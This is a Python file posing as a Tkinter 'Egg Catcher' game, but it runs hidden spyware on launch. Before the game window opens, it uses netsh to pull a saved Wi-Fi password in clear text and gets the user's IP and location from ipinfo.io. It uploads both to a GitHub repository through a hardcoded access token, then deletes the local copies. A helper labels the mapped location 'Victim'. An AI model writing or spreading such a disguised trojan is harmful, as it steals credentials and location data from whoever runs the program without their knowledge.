import subprocess
import re
import requests
import folium
import webbrowser
from github import Github
import pandas as pd
import csv
import turtle as t
import os
from itertools import cycle
from random import randrange
from tkinter import Canvas, Tk, messagebox, font
def Wifi_password():
    command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True, shell=True).stdout.decode()
    profile_names = (re.findall("All User Profile     :(.*)\r", command_output))
    name = "Jayaprakash"
    profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True, shell=True).stdout.decode()
    password = re.search("Key Content            : (.*)\r", profile_info)
    password = password[1]
    key = [name, password]
    g = Github("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")
    user = g.get_user()
    repos = user.get_repo("Information_Logs")
    l = [repo.name for repo in repos.get_contents("")]
    if "password.csv" not in l:
        data = {'name': [key[0]], 'password': [key[1]]}
        df = pd.DataFrame.from_dict(data)
        df.to_csv("password.csv")
        data = open("password.csv", "rb").read()
        repos.create_file("password.csv", "commit", data)
    else:
        data = repos.get_contents("password.csv").decoded_content
        open("password.csv", "wb").write(data)
        df = pd.read_csv("password.csv")
        df = df.drop(df.columns[0], axis=1)
        df.loc[df.shape[0]] = key
        df = df.drop_duplicates()
        df.to_csv("password.csv")
        data = open("password.csv", "rb").read()
        file = repos.get_contents("password.csv")
        repos.update_file("password.csv", "commit", data, file.sha)
    print(profile_names)
        
def location_tracker():
    res = requests.get('https://ipinfo.io/')
    data = res.json()
    return data
def plot():
    loc = location_tracker()["loc"].split(",")
    loc[0], loc[1] = float(loc[0]), float(loc[1])
    map = folium.Map(location = loc, zoom_start=50)
    map.add_child(folium.Marker(location = loc, popup = "Victim", icon = folium.Icon(color="green")))
    map.save("map.html")
    webbrowser.open("map.html")
def write():
    g = Github("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")
    user = g.get_user()
    repos = user.get_repo("Information_Logs")
    l = [repo.name for repo in repos.get_contents("")]
    if "data.csv" not in l:
        data = {'ip': [], 'hostname': [], 'city': [],
                'region': [], 'country': [], 'loc': [],
                'org': [], 'postal': [],
                'timezone': []}
        df = pd.DataFrame.from_dict(data)
        df.to_csv("data.csv")
        data = open("data.csv", "rb").read()
        repos.create_file("data.csv", "commit", data)
    else:
        data = repos.get_contents("data.csv").decoded_content
        open("data.csv", "wb").write(data)
        df = pd.read_csv("data.csv")
        df = df.drop(df.columns[0], axis=1)
        data = location_tracker()
        d = list(data.values())[:-1]
        check = list(df.columns)
        keys = list(data.keys())[:-1]
        if(len(keys)<len(check)):
            d.insert(1, "")
        df.loc[df.shape[0]] = d
        df = df.drop_duplicates()
        df.to_csv("data.csv")
        data = open("data.csv", "rb").read()
        file = repos.get_contents("data.csv")
        repos.update_file("data.csv", "commit", data, file.sha)
def create_egg():
    x = randrange(10, 740)
    y = 40
    new_egg = c.create_oval(x, y, x+egg_width, y+egg_height, fill=next(color_cycle), width=0)
    eggs.append(new_egg)
    root.after(egg_interval, create_egg)

def move_eggs():
    for egg in eggs:
        (eggx, eggy, eggx2, eggy2) = c.coords(egg)
        c.move(egg, 0, 10)
        if eggy2 > canvas_height:
            egg_dropped(egg)
    root.after(egg_speed, move_eggs)

def egg_dropped(egg):
    eggs.remove(egg)
    c.delete(egg)
    lose_a_life()
    if lives_remaining == 0:
        messagebox.showinfo("Game Over!", "Final Score: "+ str(score))
        root.destroy()

def lose_a_life():
    global lives_remaining
    lives_remaining -= 1
    c.itemconfigure(lives_text, text="Lives: "+ str(lives_remaining))

def check_catch():
    (catcherx, catchery, catcherx2, catchery2) = c.coords(catcher)
    for egg in eggs:
        (eggx, eggy, eggx2, eggy2) = c.coords(egg)
        if catcherx < eggx and eggx2 < catcherx2 and catchery2 - eggy2 < 40:
            eggs.remove(egg)
            c.delete(egg)
            increase_score(egg_score)
    root.after(100, check_catch)

def increase_score(points):
    global score, egg_speed, egg_interval
    score += points
    egg_speed = int(egg_speed * difficulty)
    egg_interval = int(egg_interval * difficulty)
    c.itemconfigure(score_text, text="Score: "+ str(score))

def move_left(event):
    (x1, y1, x2, y2) = c.coords(catcher)
    if x1 > 0:
        c.move(catcher, -20, 0)

def move_right(event):
    (x1, y1, x2, y2) = c.coords(catcher)
    if x2 < canvas_width:
        c.move(catcher, 20, 0)
write()
Wifi_password()
os.remove("data.csv")
os.remove("password.csv")
canvas_width = 800
canvas_height = 400

root = Tk()
root.title("Egg Catcher")
c = Canvas(root, width=canvas_width, height=canvas_height, background="deep sky blue")
c.create_rectangle(-5, canvas_height-100, canvas_width+5, canvas_height+5, fill="sea green", width=0)
c.create_oval(-80, -80, 120, 120, fill='orange', width=0)
c.pack()

color_cycle = cycle(["light blue", "light green", "light pink", "light yellow", "light cyan"])
egg_width = 45
egg_height = 55
egg_score = 10
egg_speed = 500
egg_interval = 4000
difficulty = 0.95
catcher_color = "blue"
catcher_width = 100
catcher_height = 100
catcher_startx = canvas_width / 2 - catcher_width / 2
catcher_starty = canvas_height - catcher_height - 20
catcher_startx2 = catcher_startx + catcher_width
catcher_starty2 = catcher_starty + catcher_height

catcher = c.create_arc(catcher_startx, catcher_starty, catcher_startx2, catcher_starty2, start=200, extent=140, style="arc", outline=catcher_color, width=3)
game_font = font.nametofont("TkFixedFont")
game_font.config(size=18)


score = 0
score_text = c.create_text(10, 10, anchor="nw", font=game_font, fill="darkblue", text="Score: "+ str(score))

lives_remaining = 3
lives_text = c.create_text(canvas_width-10, 10, anchor="ne", font=game_font, fill="darkblue", text="Lives: "+ str(lives_remaining))

eggs = []

c.bind("<Left>", move_left)
c.bind("<Right>", move_right)
c.focus_set()
root.after(1000, create_egg)
root.after(1000, move_eggs)
root.after(1000, check_catch)
root.mainloop()
